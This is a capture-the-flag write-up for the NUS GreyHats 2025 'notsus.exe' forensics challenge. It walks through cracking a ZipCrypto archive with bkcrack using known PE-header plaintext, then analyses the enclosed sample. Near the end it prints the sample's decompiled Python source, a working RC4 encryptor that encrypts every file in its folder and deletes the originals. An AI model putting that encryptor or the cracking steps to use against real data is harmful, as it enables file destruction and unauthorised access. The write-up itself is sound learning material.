# NUS GREYHATS CTF QUALS 2025

## Forensics

## notsus.exe

### Part 1, What the F@*K is this?!

We are presented with a "files.zip", which is a... zip archive (What a surprise) with 2 files inside it.

![](https://raw.githubusercontent.com/CyberSpokes/writeups/refs/heads/main/NUS%20GreyHats%20CTF%20Quals%202025/notsus/images/notsus_files1.png)  

However these files are password protected, so we can't directly access them.  

![](https://raw.githubusercontent.com/CyberSpokes/writeups/refs/heads/main/NUS%20GreyHats%20CTF%20Quals%202025/notsus/images/notsus_files2_password_protected.png)  
*note the compression ratio, which is 0%, this will become relevant later*

Pretty soon i discovered there was no way to do anything but crack the password.
So I booted up a Kali VM and started investigating!
The first thing i did was get the hash, because i thought it would be something trivial *(oh poor me)*. 
```                              
┌──(kali㉿kali)-[~/greyhats_ctf/dist-notsus.exe]
└─$ zip2john files.zip
ver 2.0 files.zip/flag.txt.yorm PKZIP Encr: cmplen=61, decmplen=49, crc=D4BEF751 ts=8893 cs=d4be type=0
ver 2.0 files.zip/notsus.exe PKZIP Encr: cmplen=6716539, decmplen=6716527, crc=0EC8CB26 ts=8574 cs=0ec8 type=0
files.zip:$pkzip$2*1*1*0*0*24*0ec8*71194974ea510e5059a59390f82dddf5cf2ce92cdda059732c5c86e725515169f8282167*2*0*3d*31*d4bef751*0*2b*0*3d*d4be*b314af2a294b308f6604b3c4d88adfa54bbfaa45511cbeed88a4af9ac5ee8dc4d00ffd0c2351ea5ad5bc424e24541c9ebe23c9424424082af2a6c38b51*$/pkzip$::files.zip:flag.txt.yorm, notsus.exe:files.zip
```
The first thing to note is that this is a "PKZIP" archive, which is first of all deprecated (Wonder why that is...), and also pretty old. By doing a quick Google search I discovered [this article](https://www.acceis.fr/cracking-encrypted-archives-pkzip-zip-zipcrypto-winzip-zip-aes-7-zip-rar/) from acceis.fr, which covers basically everything we need to crack the archive.

according to the article/manual, we need to determine if this is ZipCrypto Store or ZipCrypto Deflate. Using 7zip for this:

```
┌──(kali㉿kali)-[~/greyhats_ctf/dist-notsus.exe]
└─$ 7z l -slt files.zip

7-Zip 24.07 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-06-19
 64-bit locale=en_US.UTF-8 Threads:32 OPEN_MAX:1024

Scanning the drive for archives:
1 file, 6716892 bytes (6560 KiB)

Listing archive: files.zip

--
Path = files.zip
Type = zip
Physical Size = 6716892

----------
Path = flag.txt.yorm
Folder = -
Size = 49
Packed Size = 61
Modified = 2025-05-05 12:04:36.1284496
Created = 
Accessed = 
Attributes = A
Encrypted = +
Comment = 
CRC = D4BEF751
Method = ZipCrypto Store
Characteristics = NTFS : Encrypt
Host OS = FAT
Version = 20
Volume Index = 0
Offset = 0

Path = notsus.exe
Folder = -
Size = 6716527
Packed Size = 6716539
Modified = 2025-05-05 11:43:39.3097554
Created = 
Accessed = 
Attributes = A
Encrypted = +
Comment = 
CRC = 0EC8CB26
Method = ZipCrypto Store
Characteristics = NTFS : Encrypt
Host OS = FAT
Version = 20
Volume Index = 0
Offset = 104
```
We are lucky *(or rather, this was expected since the compression ratio was 0%!)*, and this is truly ZipCrypto Store. 

### Part 2, The Cracking
With all this in mind, we go into the guide and face our first big challenge.

***To conduct this attack, it requires at least 12 bytes of known plaintext and at least 8 of them must be contiguous. The larger the contiguous known plaintext, the faster the attack.***

At this point I thought we were cooked, how am I going to find 12 bytes inside an unkown file, or even worse a huge .exe that I've never seen before?

So I grabbed a hex editor and put on my tin foil hat...

An .exe is comprised of many parts, most non standard, and depending on the compiler, language, and other parameters, the components and contents of an .exe can vary vastly. What **could** remain constant accross most exes is the PE header and DOS stub. This was my thought process, but i had to verify it. Soooo  

First file i viewed was the zip2hashcat.exe, since who even uses John anymore?
![](https://raw.githubusercontent.com/CyberSpokes/writeups/refs/heads/main/NUS%20GreyHats%20CTF%20Quals%202025/notsus/images/zip2hashcat_hex.png)  
Great! We have our plaintext!  

``This program cannot be run in DOS mode``  

And of course the next file i randomly opened had to make me lose my sanity (Valve pls fix)  
![](https://raw.githubusercontent.com/CyberSpokes/writeups/refs/heads/main/NUS%20GreyHats%20CTF%20Quals%202025/notsus/images/tf2x64.png)  
This is the tf2_win64.exe and of course it had to have a custom header, so I was ready to switch careers and start trading crypto.
BUT because the market is so unstable, I took one last look at the IDA uninstaller *(Why not, who are you to judge anyways?)* .  
![](https://raw.githubusercontent.com/CyberSpokes/writeups/refs/heads/main/NUS%20GreyHats%20CTF%20Quals%202025/notsus/images/ida_uninstaller_hex.png)  
And now we are cooking!  
So, back to the article. We have our 12 bytes, sure, but where are they?  

*Each encrypted file has an extra 12 bytes stored at the start
of the data area defining the encryption header for that file. The
encryption header is originally set to random values, and then
itself encrypted, using three, 32-bit keys. The key values are
initialized using the supplied encryption password. After each byte
is encrypted, the keys are then updated using pseudo-random number
generation techniques in combination with the same CRC-32 algorithm
used in PKZIP and described elsewhere in this document.*

*After the header is decrypted, the last 1 or 2 bytes in Buffer
**SHOULD** be the high-order word/byte of the CRC for the file being
decrypted, stored in Intel low-byte/high-byte order. Versions of
PKZIP prior to 2.0 used a 2 byte CRC check; a 1 byte CRC check is
used on versions after 2.0. This can be used to test if the password
supplied is correct or not.*  

First of all, we inspect the hexdump of the random .exe

```
Offset 0x00: 4D 5A 90 00 03 00 00 00 04 00 00 00 FF FF 00 00 
Offset 0x10: B8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00 
Offset 0x20: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
Offset 0x30: 00 00 00 00 00 00 00 00 00 00 00 00 80 00 00 00 
Offset 0x40: 0E 1F BA 0E 00 B4 09 CD 21 B8 01 4C CD 21 54 68 
Offset 0x50: 69 73 20 70 72 6F 67 72 61 6D 20 63 61 6E 6E 6F 
```
The DOS stub starts at offset 0x40 with 0E.  
Count the bytes from 0x40 until we reach 54 (Start of "This"):  
0E 1F BA 0E 00 B4 09 CD 21 B8 01 4C CD 21 ***54*** 68  

The sequence 54 68 ... begins at offset 0x4E, which is decimal 78.  
Now the final thing we need is the encryption header, which is easy to find by looking at the article. From the CRC `0EC8CB26` we see that the most significant byte is 0E. So this is what we're going to use!

One final thing we must do is  put our string (This program...) inside a .bin file, which we do like so:
```
printf 'This program cannot be run in DOS mode.' > plain.bin
```

 Armed with all this information, it was time to build our command and crack the zip.

 We will use the [bkcrack binary](https://github.com/kimci86/bkcrack) like this:

 ```
 ./bkcrack-1.7.1-Linux/bkcrack -C files.zip -c notsus.exe -p plain.bin -o 78 -x -1 0e
 ```
 -C specifies the zip to crack   
 -c specifies the file inside the zip  
 -p is our plaintext  
 -o specifies the offset, in our case 0x78  
 -x -1 0e specifies the MSB of the CRC, and hence the beginning of the .exe  

After some time and lots of stress, we see that it works!  
![](https://raw.githubusercontent.com/CyberSpokes/writeups/refs/heads/main/NUS%20GreyHats%20CTF%20Quals%202025/notsus/images/cracking_succ.png)

Now, we have the keys, so we can extract our files. This is easy to do by just using bkcrack one more time like so, setting a password for reasons that will become clear a bit later.

```
┌──(kali㉿kali)-[~/greyhats_ctf/dist-notsus.exe]
└─$ ./bkcrack-1.7.1-Linux/bkcrack -C files.zip -k d1608c35 d11d350a 4bc3da9c -U cracked.zip {password}
bkcrack 1.7.1 - 2024-12-21
[17:40:49] Writing unlocked archive cracked.zip with password "{password}"
100.0 % (2 / 2)
Wrote unlocked archive.
```

It is now time to extract this archive inside a Windows VM and see its contents.  

### Part 3, Malware Analysis I guess?

***Be careful not to infect your pc, treat it like real malware and be cautious***   

Using a password came in handy since Windows defender detected the malware and promptly deleted it right after, and its a hassle to deal with that, but since encrypted files can't be hashed/ traced for signatures, Windows Defender found nothing up until unziping, which was enough to add an exclusion in my VM.  

Inside the VM the first thing, of course, was to open the flag.txt.yorm and see if its the actual flag. To nobody's surprise, it was encrypted :)

So, because I suck at reversing stuff, I decided to play around with it and see what it does that way. After running it in multiple sandboxes and analyzing strings and processes and dropped files, I realized that this malware encrypts the files ofthe folder from where it is launched. I hoped this wouldnt be asymmetric encryption like AES, so I decided to see if that was the case. So i created 3 text files, with the same content.

![](https://raw.githubusercontent.com/CyberSpokes/writeups/refs/heads/main/NUS%20GreyHats%20CTF%20Quals%202025/notsus/images/3_test_files.png)  
![](https://raw.githubusercontent.com/CyberSpokes/writeups/refs/heads/main/NUS%20GreyHats%20CTF%20Quals%202025/notsus/images/3_encrypted_files.png)  
From this, i was indeed very lucky, and my input  `test 12356` became garbage, but the same garbage across all 3 files! This means symmetric encryption, which means we can recover the flag by reversing the encryption process.  

So, I tried reversing this, and my first thought was to use XOR *(undeniably the best encryption algorithm known to man)*. By XORing the before and after byte-by-byte, we can get the key. So i wrote a script:
```
plaintext = "{before}"
ciphertext = b"{After in hex}"

# Recover the key by XORing each byte
key = bytes([c ^ ord(p) for c, p in zip(ciphertext, plaintext)])

print("Recovered key (bytes):", key)
print("Recovered key (hex):", key.hex())

```

After a brief visit to [Cyberchef](https://gchq.github.io/CyberChef/),  
![](https://raw.githubusercontent.com/CyberSpokes/writeups/refs/heads/main/NUS%20GreyHats%20CTF%20Quals%202025/notsus/images/half_flag.png)  

 I only got half the flag for some reason, so I once again wanted to give up, so I told a friend to take a look at it. 

He discovered **BY ACCIDENT** that the malware, when ran again, DECRYPTS the contents of the folder it previously encrypted!  
***I was officially cooked***


### Notes

I know this *probably* wasn't the designated solution, but it is the truth.
## EDIT

I don't know if this is appropriate but momma didn't raise no quitter,so I revisited the reversing to get the key and so on. Also some things i forgot to mention:
- I checked the file in virustotal and on any.run, which tracked me off course since any.run said it was upx packed, and so I tried unpacking it like that. Also binwalk worked and gave me pretty much all .pyc files but I was too focused on upx to even notice   **insert facepalm emoji here**  

- What i tried doing in my out of the box reversing was to assume the malware used something like this:
```
cipher[i] = plain[i] XOR ((base_key[i % N] + i) mod 256)
```
and I chased that model as best as I could. However, RC4s keystream is generated by a fully stateful S-box, so there is no linear `+i` patern that could be reversed. I just got very lucky, in the sense that in RC4, up to about 32 bytes, statistical biases sometimes make the keystream appear less "random". 

Now, to our reversing. Obviously since I suck at this, so I saw the posts on Discord about [PyInstaller Extractor WEB](https://pyinstxtractor-web.netlify.app/) and started digging. I used PyInstaller Extractor to... well, extract the .pyc files, and i then decompiled the notsus.pyc since it was a red herring alongside the rest, using [pylingual](https://pylingual.io). The result was this:
```
import os
import sys
from itertools import cycle

def a(b, c):
    if len(b) < len(c):
        b, c = (c, b)
    return bytes((a ^ b for a, b in zip(b, cycle(c))))

def b(a, c):
    d = list(range(256))
    e = 0
    for f in range(256):
        e = (e + d[f] + a[f % len(a)]) % 256
        d[f], d[e] = (d[e], d[f])
    f = e = 0
    g = bytearray()
    for h in c:
        f = (f + 1) % 256
        e = (e + d[f]) % 256
        d[f], d[e] = (d[e], d[f])
        k = d[(d[f] + d[e]) % 256]
        g.append(h ^ k)
    return bytes(g)

def c(a):
    b = []
    for c, d, e in os.walk(a):
        for f in e:
            b.append(os.path.join(c, f))
    return b
d = b'HACKED!'
e = os.path.basename(sys.executable)
for f in c('.'):
    if e in f:
        continue
    with open(f, 'rb') as g:
        asdf = g.read()
    with open(f'{f}.yorm', 'wb') as g:
        g.write(b(d, asdf))
    os.remove(f)
```
The function `b(a, c)` is a direct implementation of the RC4 encryption algorithm (Go ask ChatGPT if you don't believe me), and is uses the plaintext key `HACKED!`. With this, we visit CyberChef like before, aaaaaannnddd:
![](https://raw.githubusercontent.com/CyberSpokes/writeups/refs/heads/main/NUS%20GreyHats%20CTF%20Quals%202025/notsus/images/flag.png)

***I made it way harder than it had to be didn't I?***
